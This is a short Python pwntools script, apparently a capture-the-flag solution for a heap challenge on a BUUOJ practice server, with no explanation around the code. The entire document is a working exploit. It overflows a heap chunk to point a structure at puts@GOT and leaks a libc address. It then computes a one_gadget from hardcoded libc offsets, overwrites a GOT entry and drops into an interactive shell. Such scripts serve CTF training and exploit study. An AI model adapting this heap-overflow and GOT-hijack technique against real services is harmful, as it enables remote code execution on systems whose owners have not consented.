from pwn import *

io=remote('node3.buuoj.cn',27159)

def add(size,name,len,data):
    io.recvuntil('Action: ')
    io.sendline('0')
    io.recvuntil('description: ')
    io.sendline(str(size))
    io.recvuntil('name: ')
    io.sendline(name)
    io.recvuntil('length: ')
    io.sendline(str(len))
    io.recvuntil('text: ')
    io.sendline(data)

def free(idx):
    io.recvuntil('Action: ')
    io.sendline('1')
    io.recvuntil('index: ')
    io.sendline(str(idx))

def edit(idx,len,data):
    io.recvuntil('Action: ')
    io.sendline('3')
    io.recvuntil('index: ')
    io.sendline(str(idx))   
    io.recvuntil('length: ')
    io.sendline(str(len))
    io.recvuntil('text: ')
    io.sendline(data)

def show(idx):
    io.recvuntil('Action: ')
    io.sendline('2')
    io.recvuntil('index: ')
    io.sendline(str(idx))       

puts_got=0x804B024

add(0x80,'ydh',0x10,'aaaa\n')#0
add(0x10,'ydh',0x10,'bbbb\n')#1
free(0)
add(0x108,'ydh',0x150,'a'*0x124+p32(0x81)+p32(puts_got))
show(1)
io.recvuntil('description: ')
puts_add=u32(io.recv(4))
print(hex(puts_add))
libc_base=puts_add-0x05f140
one_gadget=libc_base+0x3a80c

edit(1,10,p32(one_gadget))


io.interactive()
